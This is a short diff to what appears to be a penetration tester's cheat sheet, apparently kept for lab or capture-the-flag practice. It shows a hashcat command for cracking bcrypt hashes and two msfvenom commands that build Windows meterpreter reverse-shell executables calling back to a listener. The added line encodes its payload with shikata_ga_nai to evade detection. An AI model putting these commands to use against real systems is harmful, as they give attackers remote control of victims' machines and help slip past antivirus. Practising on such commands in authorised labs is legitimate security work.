@@ -40,6 +40,8 @@ hashcat -m 3200 bcrypt.hash /usr/share/wordlists/rockyou.txt
 # MSFVENOM (msfvenom, msf, metasploit)
 Generate reverse shell exe (bash):
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=1338 -f exe -o /home/kali/rev.exe
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./Lala.exe
+
 
 # Python webserver
 Host files (bash):
